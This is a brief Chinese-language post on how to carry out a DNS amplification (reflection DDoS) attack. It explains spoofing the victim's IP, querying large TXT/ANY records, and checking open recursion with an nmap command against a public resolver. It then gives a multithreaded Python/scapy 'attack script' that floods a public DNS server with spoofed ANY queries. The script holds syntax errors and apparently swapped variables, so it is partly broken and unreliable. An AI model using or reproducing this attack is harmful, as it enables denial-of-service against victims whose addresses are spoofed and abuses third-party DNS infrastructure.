1.伪造源IP为其他人的ip地址 进行查询

2.被请求的记录体积大，比如TXT格式，400KB 在A机器上，向DNS发送查询那个TXT的记录，并伪造成别人的ip，即可理解为DNS放大攻击。

3.DNS支持递归查询，检查命令如下：

nmap -sU -p53 --script=dns-recursion 223.5.5.5





攻击脚本：



```javascript
#coding=utf-8
import socket, sys, random
from kamene.all import *
import time, threading
from concurrent.futures import ThreadPoolExecutor
def Attack():
    target = DNS地址
    dstport = 53
    isrc =  被攻击源ip
    print(isrc,dstport)
    Domain_Name = 大的解析域名
    isport = random.randint(1,65535)
    #DNS 放大攻击
     send(IP(dst="8.8.8.8",src=target)UDP()/DNS(rd=1, qdcount=1, qa=DNSQR,(qname=Domain_Name, qtype=255)),verbose=0)


executor = ThreadPoolExecutor(max_workers=30)

for i in range(100001):
    executor.submit(Attack)
    thread_num = len(threading.enumerate())
    print(f"线程数量是{thread_num}")
    # t = threading.Thread(target=Attack)
    # t.start()
```

